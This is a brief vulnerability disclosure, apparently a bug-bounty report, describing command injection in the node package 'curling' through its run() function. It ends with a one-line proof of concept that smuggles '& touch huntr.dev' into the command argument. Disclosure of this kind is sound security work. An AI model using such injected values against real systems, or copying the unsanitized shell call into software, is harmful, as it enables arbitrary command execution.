# Overview
`curling` is a node wrapper for curl with a very simple API, this package are vulnerable to Command Injection via. the `run(command,cb)` function. The command argument can be controlled by users without any sanitization.

# Proof of Concept
```
var root = require("curling");
root.run("& touch huntr.dev",function(){});
````